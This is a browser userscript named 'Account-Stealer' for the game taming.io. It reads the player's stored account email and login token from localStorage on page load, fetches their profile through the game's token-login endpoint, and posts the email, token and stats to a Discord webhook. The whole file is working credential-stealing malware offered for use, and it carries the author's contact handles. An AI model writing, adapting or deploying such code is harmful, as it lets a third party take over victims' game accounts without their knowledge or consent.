// ==UserScript==
// @name         Account-Stealer
// @namespace    http://tampermonkey.net/
// @version      2025-04-18
// @description  Taming.io Advanced Account Stealer!
// @author       xalperen
// @match        https://taming.io/
// @icon         https://i.imgur.com/cq1Fh2n.png
// @run-at       document-start
// ==/UserScript==

const webhook = 'https://discord.com/api/webhooks/....';

function game_data(mail, token) {
    const url = `https://account.taming.io/tokenLogin?mail=${mail}&token=${token}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            data.token = token;
            data.mail = mail;
            sendToWebhook(data);
        })
        .catch(error => console.error("Error fetching account data:", error));
}

function sendToWebhook(data) {
    const friendCount = data.friends?.length || 0;
    const partyMembers = data.party?.length || 0;
    const createdAt = data.createdAt ? new Date(data.createdAt).toLocaleString() : "Unknown";

    const embed = {
        username: "🔥 Taming.io Tracker",
        avatar_url: "https://i.imgur.com/cq1Fh2n.png",
        content: "**discord: xalperen**",
        embeds: [
            {
                title: `🧑 Player Info: \`${data.nickname}\``,
                color: 0x00bfff,
                description: [
                    `💌 Contact: github.com/iAlperenS ~ discord: xalperen\n`,
                    `📧 **Mail**\n\`\`\`${data.mail}\`\`\``,
                    `🔑 **Token**\n\`\`\`${data.token}\`\`\``,
                    `📅 **Account Created At**: \`${createdAt}\``,
                    `🏆 **Score**: \`${data.score}\``,
                    `⚔️ **Kills / Deaths**: \`${data.kill} / ${data.death}\``,
                    `🍎 **Total Apples**: \`${data.totalApple}\``,
                    `⏱️ **Play Time**: \`${(data.time / 3600000).toFixed(1)} hours\``,
                    `🦴 **Tames Owned**: \`${data.tames.filter(t => t > 0).length}\``,
                    `🛡️ **Last Skin**: \`${data.lastSkin}\``,
                    `✨ **Last Particle**: \`${data.lastParticle}\``,
                    `👥 **Friends**: \`${friendCount}\``,
                    `🎉 **Party Members**: \`${partyMembers}\``,
                    `⛔ **Banned**: \`${data.banned ? "✅ Yes" : "❌ No"}\``,
                    `🚫 **Ban Reason**: \`${data.banReason || "Nothing"}\``
                ].join('\n\n'),
                timestamp: new Date().toISOString(),
                footer: {
                    text: "🐺 Taming.io Account Info",
                    icon_url: "https://i.imgur.com/cq1Fh2n.png"
                }
            }
        ]
    };

    fetch(webhook, {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embed)
    })
        .then(res => {
            if (!res.ok) throw new Error("Failed to send webhook");
            console.log("✅ Data sent to webhook.");
        })
        .catch(err => console.error("Webhook error:", err));
}

let mail = localStorage.getItem('accMail');
let accToken = localStorage.getItem('accToken');

if (mail && accToken) {
    game_data(mail, accToken);
} else {
    console.warn("❌ Account mail or token not found in localStorage.");
}
